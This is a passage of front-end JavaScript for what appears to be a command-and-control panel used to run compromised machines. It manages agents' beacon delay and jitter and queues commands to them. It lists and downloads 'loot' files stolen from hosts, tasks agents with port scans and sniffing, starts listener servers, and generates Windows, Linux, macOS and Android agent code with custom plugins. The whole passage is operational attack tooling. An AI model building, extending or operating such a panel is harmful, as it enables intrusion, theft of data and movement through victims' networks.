                    placeholder.className = "msg-drop-placeholder";
                    placeholder.style.height = rect.height + "px";

                    const startIndex = items.indexOf(msgDiv);
                    requestList.insertBefore(placeholder, msgDiv.nextSibling);
                    document.body.appendChild(msgDiv);
                    msgDiv.classList.add("msg-item-dragging");
                    msgDiv.style.position = "fixed";
                    msgDiv.style.left = rect.left + "px";
                    msgDiv.style.top = rect.top + "px";
                    msgDiv.style.width = rect.width + "px";
                    msgDiv.style.pointerEvents = "none";

                    activeMessageDrag = {
                        item: msgDiv,
                        handle: handle,
                        placeholder: placeholder,
                        requestList: requestList,
                        startIndex: startIndex,
                        offsetX: event.clientX - rect.left,
                        offsetY: event.clientY - rect.top,
                    };

                    document.addEventListener("pointermove", onMessageDragMove);
                    document.addEventListener("pointerup", stopMessageDrag);
                    document.body.style.userSelect = "none";
                }

                function onMessageDragMove(event) {
                    if (!activeMessageDrag) {
                        return;
                    }
                    event.preventDefault();
                    const drag = activeMessageDrag;
                    drag.item.style.left = (event.clientX - drag.offsetX) + "px";
                    drag.item.style.top = (event.clientY - drag.offsetY) + "px";

                    const siblings = Array.from(
                        drag.requestList.querySelectorAll('.msg-item[data-reorderable="true"]')
                    );
                    let inserted = false;
                    for (const sibling of siblings) {
                        const rect = sibling.getBoundingClientRect();
                        if (event.clientY < rect.top + rect.height / 2) {
                            drag.requestList.insertBefore(drag.placeholder, sibling);
                            inserted = true;
                            break;
                        }
                    }
                    if (!inserted) {
                        drag.requestList.appendChild(drag.placeholder);
                    }
                }

                async function stopMessageDrag() {
                    if (!activeMessageDrag) {
                        return;
                    }
                    const drag = activeMessageDrag;
                    activeMessageDrag = null;
                    document.removeEventListener("pointermove", onMessageDragMove);
                    document.removeEventListener("pointerup", stopMessageDrag);
                    document.body.style.userSelect = "";

                    const requestChildren = Array.from(drag.requestList.children);
                    const placeholderIndex = requestChildren.indexOf(drag.placeholder);
                    const prevItem = drag.placeholder.previousElementSibling;
                    const nextItem = drag.placeholder.nextElementSibling;

                    drag.requestList.insertBefore(drag.item, drag.placeholder);
                    drag.placeholder.remove();
                    drag.item.classList.remove("msg-item-dragging");
                    drag.item.style.position = "";
                    drag.item.style.left = "";
                    drag.item.style.top = "";
                    drag.item.style.width = "";
                    drag.item.style.pointerEvents = "";

                    try {
                        if (placeholderIndex !== drag.startIndex) {
                            if (nextItem && nextItem.dataset.reorderable === "true") {
                                await sendReorderByIndex(
                                    drag.startIndex,
                                    Number(nextItem.dataset.sourceIndex || "0"),
                                    "before"
                                );
                            } else if (prevItem && prevItem.dataset.reorderable === "true") {
                                await sendReorderByIndex(
                                    drag.startIndex,
                                    Number(prevItem.dataset.sourceIndex || "0"),
                                    "after"
                                );
                            }
                        }
                        refreshMessageIndexes();
                    } catch (err) {
                        console.error("drag reorder failed:", err);
                        loadMessages();
                    }
                }

                // 删除
                async function deleteMsg(msgDiv) {
                    const requestList = getRequestList();
                    const idx = requestList ?
                        Array.from(requestList.children).indexOf(msgDiv) :
                        -1;
                    if(idx < 0){
                        return;
                    }
                    try{
                        await webSocketClient.send(
                            
                            "delMsgGet",
                            {
                                uid: uid,
                                index: String(idx)
                            }
                        );
                        msgDiv.remove();
                        refreshMessageIndexes();
                        customLog("Message deleted");
                    }catch(err){
                        console.error("delete msg error:",err);
                    }
                }
                // 发送 reorder 请求（支持 before / after）
                async function sendReorderByIndex(s_id,t_id,mode){
                    if(
                        s_id === -1 ||
                        t_id === -1
                    ){
                        throw new Error("invalid dom index");
                    }
                    let pos;
                    if(mode==="before"){
                        pos=t_id;
                    }else{
                        pos=t_id+1;
                    }
                    try{
                        let data =
                            await webSocketClient.send(
                                
                                "changeMsh",
                                {
                                    uid:uid,
                                    s_id:String(s_id),
                                    pos:String(pos)
                                }
                            );
                        return data;
                    }catch(err){
                        console.error("reorder failed:",err);
                        throw err;
                    }
                }
                loadMessages();
                dialog._msgInterval = setInterval(loadMessages, 30000);
                // 弹窗关闭时清理定时器
                dialog.querySelector("#msg-close-btn").addEventListener("click", function() {
                    if (dialog._msgInterval) clearInterval(dialog._msgInterval);
                });
            }, 200);
        }
        async saveInfo(uid) {
            const remarks = document.getElementById('remarks_' + uid).value;
            const delay = document.getElementById('delay_' + uid).value;
            const jitter = document.getElementById('jitter_' + uid).value;
            const username = document.getElementById('username_' + uid).value;
            try{
                let result = await webSocketClient.send(
                    
                    "change",
                    {
                        remarks: remarks,
                        delay: delay,
                        jitter: jitter,
                        username: username,
                        uid: uid,
                        taskid: AgentTaskId
                    }
                );
                // change 成功
                this.updateUserData(
                    uid,
                    remarks,
                    delay,
                    username,
                    jitter
                );
            }catch(err){
                console.log("change failed:",err.message);
                let new_user =document.getElementById('username_' + uid).value;
                if(!new_user){
                    return;
                }
                try{
                    let client = await webSocketClient.send(
                        
                        "confirm",
                        {
                            uid:uid,
                            username:new_user
                        }
                    );
                    const userIndex =User_data.findIndex(client=>client.uid===uid);
                    if(userIndex!==-1){
                        User_data[userIndex].remarks =remarks;
                        User_data[userIndex].delay =delay;
                        User_data[userIndex].username =username;
                        User_data[userIndex].jitter =jitter;
                    }
                    this.updateUserUI(uid,remarks,delay,username,jitter);
                }catch(e){
                    console.error("confirm error:",e);
                }
            }
        }
        updateUserUI(uid, remarks, delay, username, jitter) {
            document.getElementById('remarks_' + uid).value = remarks;
            document.getElementById('delay_' + uid).value = delay;
            document.getElementById('username_' + uid).value = username;
            document.getElementById('jitter_' + uid).value = jitter;
        }

        async checkTime() {
            if(!check_time ||!Array.isArray(check_time) ||check_time.length === 0){
                console.log("check_time is empty");
                return;
            }
            check_time.forEach(item=>{
                let userDiv =document.getElementById(item.uid + "info");
                if(userDiv){
                    let imgElement = document.getElementById(item.uid + "-img");
                    let checkElement =document.getElementById(item.uid + "-check");
                    let previousTime =
                        userDiv.dataset.lastCheckTime ||
                        (checkElement ? checkElement.innerText.trim() : "");
                    let hasChanged =
                        previousTime !== "" &&
                        previousTime !== item.checkTime;
                    if(imgElement){
                        if(hasChanged){
                            imgElement.outerHTML = '<img class="ip-address" id="' + item.uid + '-img" src="rhythm.gif" style="width: 106px; height: 46px; display: inline-block; vertical-align: middle;"/>';
                        } else {
                            imgElement.outerHTML = '<div class="ip-address" id="' + item.uid + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>';
                        }
                    }
                    if(checkElement){
                        checkElement.innerText =item.checkTime;
                    }
                    userDiv.dataset.lastCheckTime = item.checkTime;
                }
            });
            console.log(check_time);
        }
        async del(uid){
            let right = await customConfirm("confirm?");
            if(right){
                document
                .getElementById("container-"+uid)
                ?.remove();
                webSocketClient.send(
                    "delInfo",
                    {
                        uid: uid
                    }
                );
            }
        }
    loothander(data){
        const lootDiv = document.getElementById("g_file");
        if(!lootDiv){
            return;
        }
        lootDiv.classList.add("loot-list");
        lootDiv.innerHTML = "";
        if(!Array.isArray(data) || data.length === 0){
            lootDiv.textContent = "No loot available";
            lootDiv.classList.add("loot-empty-state");
            return;
        }
        lootDiv.classList.remove("loot-empty-state");

        data.forEach((entry)=>{
            const uid = entry.uid || "";
            const host = entry.host || "";
            const files = Array.isArray(entry.files) ? entry.files : [];

            const card = document.createElement("div");
            card.className = "loot-card";

            const title = document.createElement("div");
            title.className = "loot-card-title";
            title.innerHTML =
                "<strong>Host:</strong> " + host +
                " <span class='loot-card-uid'><strong>UID:</strong> " + uid + "</span>";
            card.appendChild(title);

            if(files.length === 0){
                const empty = document.createElement("div");
                empty.className = "loot-empty";
                empty.textContent = "No files";
                card.appendChild(empty);
                lootDiv.appendChild(card);
                return;
            }

            files.forEach((file)=>{
                const row = document.createElement("div");
                row.className = "loot-row";

                const info = document.createElement("div");
                info.className = "loot-info";
                const name = file.name || "";
                const size = typeof file.size === "number" ? file.size : 0;
                const modTime = file.mod_time || "";
                info.innerHTML =
                    "<div class='loot-file-name'><strong>" + name + "</strong></div>" +
                    "<div class='loot-meta'>size: " + size +
                    " | modified: " + modTime + "</div>";

                const btn = document.createElement("button");
                btn.type = "button";
                btn.className = "loot-download-btn";
                btn.textContent = "Download";
                btn.onclick = () => {
                    this.downloadLoot(uid, name);
                };

                row.appendChild(info);
                row.appendChild(btn);
                card.appendChild(row);
            });

            lootDiv.appendChild(card);
        });
    }
    async downloadLoot(uid,file){
        try{
            await webSocketClient.downloadFile(
                "download_loot",
                {
                    uid: uid,
                    file: file
                }
            );
        }catch(err){
            console.error(
                "download loot error:",
                err
            );
            customLog("Download failed");
        }
    }
}
class lain_net{
    async requestNetData(uid = null) {
        const shellSelect = document.getElementById("net_shell");
        uid = uid || (shellSelect ? shellSelect.value : "");
        if (!uid) {
            this.renderNetList([], "");
            this.getshellip([], "");
            return false;
        }
        const sent = await webSocketClient.send(
            "getNetdata",
            {
                uid: uid
            }
        );
        if (!sent) {
            customLog("Get network data failed");
            return false;
        }
        return true;
    }
    renderNetList(net_data = [], uid = null) {
        const netDiv = document.getElementById("net_div");
        if (!netDiv) {
            return;
        }
        netDiv.innerHTML = "";
        if (!Array.isArray(net_data) || net_data.length === 0) {
            return;
        }

        net_data.forEach((item) => {
            if (!item) {
                return;
            }
            const row = document.createElement("div");
            row.className = "net_div_son";
            row.style.display = "flex";
            row.style.justifyContent = "space-between";
            row.style.alignItems = "flex-start";
            row.style.gap = "12px";

            const contentDiv = document.createElement("div");
            contentDiv.style.flex = "1";

            const target = item.target || "";
            const title = document.createElement("div");
            title.textContent = target || "";
            contentDiv.appendChild(title);

            if (Array.isArray(item.shell_innet) && item.shell_innet.length > 0) {
                const innetDiv = document.createElement("div");
                innetDiv.textContent = item.shell_innet.join(", ");
                contentDiv.appendChild(innetDiv);
            }

            row.appendChild(contentDiv);

            if (uid && target) {
                const button = document.createElement("button");
                button.type = "button";
                button.textContent = "remove";
                button.onclick = () => {
                    this.del_net(target, uid);
                };
                row.appendChild(button);
            }

            netDiv.appendChild(row);
        });
    }
    async scan(){
        var uid = document.getElementById('net_shell').value;
        if (!uid) {
            customLog("Please select an agent");
            return false;
        }
        let optionValue = document.getElementById('net_options').value; //选项
        let targetValue = document.getElementById('net_target').value; //目标
        let targetListValue = document.getElementById('net_target_list').value; //探测范围
        var sleepTimeValue = document.getElementById('net_sleep_time').value; //休眠时间
        let customSleepTimeValue = document.getElementById('custom_sleep_time').value; //自定义时间
        if (sleepTimeValue === 'custom') {
            sleepTimeValue = customSleepTimeValue;
        }
        console.log('Select:', optionValue);
        console.log('IP:', targetValue);
        console.log('Range:', targetListValue);
        console.log('Delay:', sleepTimeValue);
        
        if (isNaN(sleepTimeValue) || sleepTimeValue < 1) {
            sleepTimeValue = 1; // 默认最小值为1
        }

        if(optionValue === "scan"){
            var cmd="GET_PORTS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
        }else if(optionValue === "sniff"){
            var cmd="GET_U_FRIENDS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
        } else {
            customLog("Please select scan type");
            return false;
        }
        const sent = await webSocketClient.send(
            "msg",
            {
                uid:uid,
                msg:cmd,
                Taskid:AgentTaskId
            }
        );
        if (!sent) {
            customLog("Send failed");
            return false;
        }
        return true;
    }
    async del_net(target, uid){
        try {
            let result = await webSocketClient.send(
                
                "delShellInnet",
                {
                    uid: uid,
                    target: target
                }
            );
            console.log("delete shell innet:",result);
        } catch(err){
            console.error("del shell innet error:",err);
        }
    }
    getshellip(shell_ip_data = null, uid = null){
        if (!uid) {
            const shellSelect = document.getElementById("net_shell");
            uid = shellSelect ? shellSelect.value : "";
        }
        try {
            if (!uid) {
                return;
            }
    
            if (shell_ip_data === null || typeof shell_ip_data === "undefined") {
                shell_ip_data =
                    (window.shellInnetData && window.shellInnetData[uid]) ||
                    [];
            }
    
            let shell_ip_list = [];
            if (Array.isArray(shell_ip_data)) {
                shell_ip_list = shell_ip_data;
            } else if (typeof shell_ip_data === "string") {
                shell_ip_list = shell_ip_data.split(",");
            } else if (shell_ip_data && typeof shell_ip_data === "object") {
                shell_ip_list = Object.values(shell_ip_data);
            } else if (shell_ip_data !== null && shell_ip_data !== undefined) {
                shell_ip_list = [String(shell_ip_data)];
            }
    
            const have_ip_div = document.getElementById("have_ip");
            if (!have_ip_div) {
                return;
            }
    
            have_ip_div.innerHTML = "";
    
            let cur_div = document.createElement("div");
            cur_div.textContent = "Host net:";
            have_ip_div.appendChild(cur_div);
    
            shell_ip_list.forEach(item => {
                if (!item) {
                    return;
                }
                let div = document.createElement("div");
                div.textContent = "IP: " + item;
                have_ip_div.appendChild(div);
            });
        } catch(err){
            console.error("get shell ip error:", err);
        }
    }
}

class lain_server {
    getOnlineTeammatesMarkup() {
        const teamList = Array.isArray(onlineTeammates) ? onlineTeammates : [];
        const count = teamList.length;
        const listItems = count > 0 ?
            teamList.map((user) => {
                return "<li class='online-teammate-item'>" +
                    escapeHtml(user) +
                    "</li>";
            }).join("") :
            "<li class='online-teammate-empty'>No teammates online</li>";
        return (
            "<div id='online-teammates-card' class='online-teammates-card'>" +
                "<div class='online-teammates-head'>" +
                    "<div class='online-teammates-copy'>" +
                        "<div class='online-teammates-title'>Online teammates</div>" +
                        "<div class='online-teammates-subtitle'>Current teammates connected to the panel</div>" +
                    "</div>" +
                    "<div class='online-teammates-actions'>" +
                        "<span id='online-teammates-count' class='online-teammates-count'>" + count + "</span>" +
                        "<button type='button' class='online-teammates-action online-teammates-refresh'>Refresh</button>" +
                        "<button type='button' class='online-teammates-action online-teammates-toggle'>Show list</button>" +
                    "</div>" +
                "</div>" +
                "<div class='online-teammates-toolbar'>" +
                    "<button type='button' class='online-teammates-action online-teammates-action-strong' onclick='openStartServerDialog()'>Start server</button>" +
                    "<button type='button' class='online-teammates-action' onclick='clearMemory()'>Clear memory</button>" +
                    "<button type='button' class='online-teammates-action' onclick='downLog()'>Download log</button>" +
                "</div>" +
                "<div id='online-teammates-list' class='online-teammates-list'>" +
                    "<div class='online-teammates-list-label'>Teammate list</div>" +
                    "<ul class='online-teammates-list-body'>" + listItems + "</ul>" +
                "</div>" +
            "</div>"
        );
    }
    renderOnlineTeammatesCard() {
        const mountNode = document.getElementById("online_teammates_mount");
        if (!mountNode) {
            return;
        }
        const card = mountNode.querySelector("#online-teammates-card");
        if (!card) {
            mountNode.innerHTML = this.getOnlineTeammatesMarkup();
            return;
        }
        const teamList = Array.isArray(onlineTeammates) ? onlineTeammates : [];
        const countNode = card.querySelector("#online-teammates-count");
        const listNode = card.querySelector("#online-teammates-list ul");
        const toggleBtn = card.querySelector(".online-teammates-toggle");
        if (countNode) {
            countNode.textContent = String(teamList.length);
        }
        if (listNode) {
            listNode.innerHTML = teamList.length > 0 ?
                teamList.map((user) => {
                    return "<li class='online-teammate-item'>" +
                        escapeHtml(user) +
                        "</li>";
                }).join("") :
                "<li class='online-teammate-empty'>No teammates online</li>";
        }
        const listPanel = card.querySelector("#online-teammates-list");
        if (listPanel && toggleBtn && listPanel.style.display === "none") {
            toggleBtn.textContent = "Show list";
        }
    }
    async requestOnlineTeammates() {
        try {
            const responsePromise = webSocketClient.waitForMessage(
                (msg) => {
                    return msg.path === "onlineteamment" && msg.code === 200;
                },
                15000
            );
            const sent = await webSocketClient.send(
                "onlineteamment",
                {}
            );
            if (!sent) {
                customLog("Failed to request online teammates");
                return false;
            }
            const result = await responsePromise;
            onlineTeammates = Array.isArray(result.data) ? result.data : [];
            window.onlineTeammates = onlineTeammates;
            this.renderOnlineTeammatesCard();
            return true;
        } catch (err) {
            console.error("online teammates error:", err);
            customLog("Failed to load online teammates");
            return false;
        }
    }
    async clear_memory(){
        try{
            let result = await webSocketClient.send(
                
                "cleanup",
                {}
            );
            console.log(
                "cleanup success:",
                result
            );
        }catch(err){
            console.error(
                "cleanup error:",
                err
            );
        }
    }
    async start_server() {
        const form = document.getElementById("serverForm");
        if (!form) {
            customAlert("Server form not found");
            return false;
        }
        const formData = new FormData(form);
        const jsonData = {};
        const certContent = formData.get("cert") || "";
        const keyContent = formData.get("key") || "";
        formData.forEach((value, key) => {
            if(
                key !== "cert" &&
                key !== "key"
            ){
                jsonData[key] = value;
            }
        });
        jsonData.cert = certContent;
        jsonData.key = keyContent;
        // 添加用户名
        jsonData.username = Username;
        try{
            const responsePromise = webSocketClient.waitForMessage(
                (msg) => {
                    return msg.path === "startServer";
                },
                15000
            );
            const sent = await webSocketClient.send(
                "startServer",
                jsonData
            );
            if (!sent) {
                customAlert("Start server send failed");
                return false;
            }
            const result = await responsePromise;
            if (!result || result.code !== 200) {
                customAlert(
                    (result && result.message) ||
                    "Start server failed"
                );
                return false;
            }
            customLog(
                result.message ||
                ("Server started on port " + (result.port || ""))
            );
            return true;
        }catch(err){
            console.error("start server error:",err);
            customAlert("Start server failed: " + err.message);
            return false;
        }
    }

    updateServerIndex() {
        if (!Array.isArray(server_data)) {
            console.error("server_data is not an array");
            return;
        }
        this.renderOnlineTeammatesCard();
        const serverIndexDiv = document.getElementById('server_index');
        if (!serverIndexDiv) return;
        let htmlContent = "";
        for (const server of server_data) {
            const keyPathRaw = String(server.keyPath || "");
            const certPathRaw = String(server.certPath || "");
            const key_path = keyPathRaw.length > 22 ? keyPathRaw.substring(0, 22) + "..." : keyPathRaw;
            const cert_path = certPathRaw.length > 22 ? certPathRaw.substring(0, 22) + "..." : certPathRaw;
            const clientCount = serverClientCounts[String(server.port)] || 0;
            htmlContent += "<article id='" + escapeHtml(server.port) + "-info' class='server-card'>";
                htmlContent += "<div class='server-card-head'>";
                    htmlContent += "<div class='server-card-copy'>";
                        htmlContent += "<div class='server-card-title'>" + escapeHtml(server.remark || "Unnamed server") + "</div>";
                        htmlContent += "<div class='server-card-subtitle'>" + escapeHtml(server.path || "/") + "</div>";
                    htmlContent += "</div>";
                    htmlContent += "<div class='server-card-badges'>";
                        htmlContent += "<span class='server-badge'>" + escapeHtml(String(server.protocol || "").toUpperCase()) + "</span>";
                        htmlContent += "<span class='server-badge server-badge-accent'><span id='" + escapeHtml(server.port) + "'>" + clientCount + "</span> agents</span>";
                    htmlContent += "</div>";
                htmlContent += "</div>";
                htmlContent += "<div class='server-meta-grid'>";
                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>Port</span><span class='server-meta-value'>" + escapeHtml(server.port) + "</span></div>";
                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>User</span><span class='server-meta-value'>" + escapeHtml(server.user) + "</span></div>";
                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>Cert</span><span class='server-meta-value'>" + escapeHtml(cert_path || "-") + "</span></div>";
                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>Key</span><span class='server-meta-value'>" + escapeHtml(key_path || "-") + "</span></div>";
                htmlContent += "</div>";
                htmlContent += "<div class='server-action-groups'>";
                    htmlContent += "<div class='server-action-row'>";
                if (server.windows_pro === "group_pro") {
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "'>Win agent</a>";
                } else {
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "'>Win agent</a>";
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='linux' data-port='" + server.port + "'>Linux agent</a>";
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='macos' data-port='" + server.port + "'>macOS agent</a>";
                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='android' data-port='" + server.port + "'>Android agent</a>";
                }
                    htmlContent += "</div>";
                    htmlContent += "<div class='server-action-row server-action-row-secondary'>";
                        htmlContent += "<a class='server-action-pill server-action-pill-secondary download-config' href='javascript:void(0)' data-port='" + server.port + "'>Download config</a>";
                        htmlContent += "<a class='server-action-pill server-action-pill-secondary modifyServerHeader' href='javascript:void(0)' data-port='" + server.port + "'>Headers</a>";
                        htmlContent += "<a class='server-action-pill server-action-pill-secondary plugin' href='javascript:void(0)' data-port='" + server.port + "' style='top: 30%;'>Plugins</a>";
                        htmlContent += "<a class='server-action-pill server-action-pill-danger delete-server' href='javascript:void(0)' data-port='" + server.port + "'>Delete</a>";
                    htmlContent += "</div>";
                htmlContent += "</div>";
            htmlContent += "</article>";
        }
        serverIndexDiv.innerHTML = htmlContent;
    }
    async initServerIndexClickHandler() {
        const serverPage = document.getElementById('server');
        if (!serverPage) return;
        if (serverPage.dataset.clickBound === "true") {
            return;
        }
        serverPage.dataset.clickBound = "true";
        serverPage.addEventListener('click', async (event) => {
            const target = event.target;
            if (target.classList.contains('online-teammates-refresh')) {
                await this.requestOnlineTeammates();
                return;
            }
            if (target.classList.contains('online-teammates-toggle')) {
                const card = target.closest("#online-teammates-card");
                const listPanel = card ? card.querySelector("#online-teammates-list") : null;
                if (!listPanel) {
                    return;
                }
                const expanded = listPanel.style.display === "block";
                listPanel.style.display = expanded ? "none" : "block";
                target.textContent = expanded ? "Show list" : "Hide list";
                return;
            }
            if (target.classList.contains('delete-server')) {
                const port = target.getAttribute('data-port');
                try {
                    const confirmed = await customConfirm("confirm?");
                    if (!confirmed) {
                        return;
                    }
                    const responsePromise = webSocketClient.waitForMessage(
                        (msg) => {
                            return msg.path === "delserver";
                        },
                        15000
                    );
                    const sent = await webSocketClient.send(
                        "delserver",
                        {
                            port: port
                        }
                    );
                    if (!sent) {
                        customAlert("Delete server send failed");
                        return;
                    }
                    const data = await responsePromise;
                    // 有代理不能删除
                    if (!data || data.code !== 200) {
                        customAlert(
                            (data && data.message) ||
                            "Delete server failed"
                        );
                        return;
                    }
                    // 删除本地数据
                    server_data =
                        server_data.filter(
                            s => s.port !== port
                        );
                    const serverDiv = document.getElementById(port + "-info");
                    if (serverDiv) {
                        serverDiv.remove();
                    }
                    customLog(data.message || "Server deleted");
                } catch(err) {
                    console.error(
                        "delete server error:",
                        err
                    );
                    customAlert("Delete server failed: " + err.message);
                }
            }
            if (target.classList.contains('download-config')) {
                const port = target.getAttribute('data-port');
                this.downloadConfig(port);
            }
            if (target.classList.contains('modifyServerHeader')) {
                const port = target.getAttribute('data-port');
                this.modifyServerHeader(port);
            }
            if (target.classList.contains('agent-link')) {
                const os = target.getAttribute('data-os');
                const port = target.getAttribute('data-port');
                if (!Array.isArray(server_data)) {
                    console.error("server_data is null", server_data);
                    return;
                }
                const server = server_data.find(s => s.port === port);
                if (!server) return;
                const path = server.path.replace(/^\//, "");
                let code = "";
                if (Array.isArray(server_plugin)) {
                    const matchedPlugins = server_plugin.filter(function(pluginItem) {
                        if (!pluginItem) {
                            return false;
                        }
                        const pluginRemark = String(
                            pluginItem.remark || pluginItem.Remark || ""
                        );
                        const pluginOS = String(
                            pluginItem.os || pluginItem.OS || ""
                        ).toLowerCase();
                        const pluginCode = pluginItem.code || pluginItem.Code || "";
                        return pluginRemark === String(server.remark || "") &&
                            pluginOS === String(os || "").toLowerCase() &&
                            typeof pluginCode === "string" &&
                            pluginCode.trim() !== "";
                    });
                    code = matchedPlugins
                    .map(function(pluginItem) {
                        return pluginItem.code || pluginItem.Code || "";
                    })
                    .join("\n\n")
                    .trim();
                }
                if (!code) {
                    code = "/*code*/";
                }
                // 按 redirectToAgentCode 的参数顺序调用（protocol, os, server, path, ... , code, windows_pro）
                this.redirectToAgentCode(
                    server.protocol,
                    os,
                    main_server+":"+server.port,
                    path,
                    server.conn_path,
                    server.msg_path,
                    server.switch_path,
                    server.encry_path,
                    server.download_path,
                    server.result_path,
                    server.net_path,
                    server.info_path,
                    server.upload_path,
                    server.list_path,
                    server.option_path,
                    server.user,
                    server.uid,
                    server.hostname,
                    server.keyPart,
                    server.filekey,
                    code,
                    server.windows_pro
                );
            }
            if (target.classList.contains('plugin')) {
                const port = target.getAttribute('data-port');
                const server = server_data.find(s => s.port === port);
                if (!server) return;
                let dialog = document.getElementById("serverDialog");
                if (!dialog) {
                    dialog = document.createElement("div");
                    dialog.id = "serverDialog";
                    dialog.className = "serverDialog";
                    dialog.style.left = "50%";
                    dialog.style.display = "block";
                    dialog.dataset.remark = server.remark;

                    dialog.innerHTML =
                        "<div class='plugin-dialog-header'>" +
                            "<button type='button' class='plugin-close-btn' onclick='closeStartServerDialog()' aria-label='close plugin dialog'>×</button>" +
                            "<h3>plugin</h3>" +
                        "</div>" +
                        "<form id='pluginForm' method='POST' class='plugin-form'>" +
                        "<select id='select_os'>" +
                            "<option value='win'>windows</option>" +
                            "<option value='linux'>linux</option>" +
                            "<option value='macos'>macos</option>" +
                            "<option value='android'>android</option>" +
                        "</select><br>" +
                        "<input name='codeWord' placeholder='codeWord'><br>" +
                        "<div id='parameterContainer'>" +
                            "<span>Parameter count: <span id='parameterCount'>1</span></span>" +
                            "<button type='button' id='addParameterBtn'>+</button>" +
                            "<button type='button' id='removeParameterBtn'>-</button>" +
                            "<input type='hidden' name='parameter' id='parameterHidden' value='1' />" +
                        "</div>" +
                        "<input name='code' placeholder='golang language.msg-1,msg-2,msg-3 for parameter'><br>" +
                        "<input id='parameterDec' name='parameterDec' placeholder='Meaning of parameter'><br>" +
                        "<button type='button' id='submitBtn'>plugin</button>" +
                        "</form>" +
                        "<div id='plugin_list' class='plugin_list'></div>";

                    document.getElementById("server_index").appendChild(dialog);
                    requestAnimationFrame(() => {
                        dialog.style.transform = "translateX(-50%) scaleY(1)";
                        dialog.style.opacity = "1";
                    });

                    // 绑定参数加减按钮事件（首次创建时）
                    const addBtn = dialog.querySelector('#addParameterBtn');
                    const removeBtn = dialog.querySelector('#removeParameterBtn');
                    const countDisplay = dialog.querySelector('#parameterCount');
                    const countHidden = dialog.querySelector('#parameterHidden');
                    const pluginForm = dialog.querySelector('#pluginForm');
                    const submitBtn = dialog.querySelector('#submitBtn');

                    if (pluginForm) {
                        pluginForm.onsubmit = function(event) {
                            event.preventDefault();
                        };
                    }
                    if (submitBtn) {
                        submitBtn.onclick = function() {
                            submitPlugin();
                        };
                    }

                    if (addBtn && removeBtn && countDisplay && countHidden) {
                        addBtn.onclick = () => {
                            let count = parseInt(countHidden.value);
                            if (count < 20) {
                                count++;
                                countHidden.value = count;
                                countDisplay.textContent = count;
                            }
                        };
                        removeBtn.onclick = () => {
                            let count = parseInt(countHidden.value);
                            if (count > 1) {
                                count--;
                                countHidden.value = count;
                                countDisplay.textContent = count;
                            }
                        };
                    }
                    this.refreshPluginList();
                } else {
                    dialog.style.display = "block";
                    dialog.style.transform = "translateX(-50%) scaleY(1)";
                    dialog.style.opacity = "1";
                    if (dialog.dataset.remark !== server.remark) {
                        dialog.dataset.remark = server.remark;
                        this.refreshPluginList();
                    }
                }
            }
        });
    }

    refreshPluginList() {
        const serverUi = this;
        var pluginList = document.getElementById("plugin_list");
        if (!pluginList) return;
        var dialog = document.getElementById("serverDialog");
        var currentRemark = dialog ? dialog.dataset.remark : "";
        pluginList.innerHTML = "";
        pluginList.classList.add("plugin-panel");
        if (
            !Array.isArray(server_plugin) ||
            server_plugin.length === 0
        ) {
            pluginList.innerHTML = "<div class='plugin-empty'>No plugin available</div>";
            return;
        }
        var pluginItems = server_plugin.filter(function(item) {
            if (!item) {
                return false;
            }
            if (!currentRemark) {
                return true;
            }
            return String(item.remark || item.Remark || "") === String(currentRemark);
        });
        if (pluginItems.length === 0) {
            pluginList.innerHTML = "<div class='plugin-empty'>No plugin available</div>";
            return;
        }
        var validItems = pluginItems.filter(function(item) {
            var codeStr = item.code || item.Code || "";
            return codeStr && codeStr !== "/*code*/";
        });
        if (validItems.length === 0) {
            pluginList.innerHTML = "<div class='plugin-empty'>No plugin available</div>";
            return;
        }

        var section = document.createElement("div");
        section.id = "plugin_section";
        section.className = "plugin-section";
        pluginList.appendChild(section);

        var title = document.createElement("h3");
        title.className = "plugin-section-title";
        title.textContent = "Plugin Library";
        section.appendChild(title);

        var osLabels = {
            win: "Windows",
            linux: "Linux",
            macos: "macOS",
            android: "Android",
            unknown: "Other"
        };
        var grouped = {};
        validItems.forEach(function(item) {
            var key = String(item.os || item.OS || "unknown").toLowerCase();
            if (!grouped[key]) {
                grouped[key] = [];
            }
            grouped[key].push(item);
        });

        ["win", "linux", "macos", "android", "unknown"].forEach(function(osKey) {
            if (!grouped[osKey] || grouped[osKey].length === 0) {
                return;
            }
            var groupCard = document.createElement("div");
            groupCard.className = "plugin-os-group";

            var groupHeader = document.createElement("div");
            groupHeader.className = "plugin-os-header";

            var osBadge = document.createElement("span");
            osBadge.className = "plugin-os-badge plugin-os-" + osKey;
            osBadge.textContent = osLabels[osKey] || osKey;

            var osCount = document.createElement("span");
            osCount.className = "plugin-os-count";
            osCount.textContent = grouped[osKey].length + " plugin" + (grouped[osKey].length > 1 ? "s" : "");

            var groupTools = document.createElement("div");
            groupTools.className = "plugin-os-tools";
            groupTools.appendChild(osCount);

            groupHeader.appendChild(osBadge);
            groupHeader.appendChild(groupTools);
            groupCard.appendChild(groupHeader);

            var groupList = document.createElement("div");
            groupList.className = "plugin-os-list";

            grouped[osKey].forEach(function(item) {
                var codeStr = item.code || item.Code || "";
                var codeWord = item.codeWord || item.CodeWord || "unnamed";
                var parameters = item.parameter || item.Parameter || [];
                var parameterDesc = item.parameter_desc || item.ParameterDesc || [];
                var pluginItem = document.createElement("article");
                pluginItem.className = "plugin-item";

                var itemTop = document.createElement("div");
                itemTop.className = "plugin-item-top";

                var meta = document.createElement("div");
                meta.className = "plugin-item-meta";

                var codeWordTag = document.createElement("span");
                codeWordTag.className = "plugin-codeword";
                codeWordTag.textContent = codeWord;

                var metaText = document.createElement("div");
                metaText.className = "plugin-meta-text";

                var paramText = document.createElement("div");
                paramText.className = "plugin-param-line";
                paramText.textContent = Array.isArray(parameters) && parameters.length > 0 ?
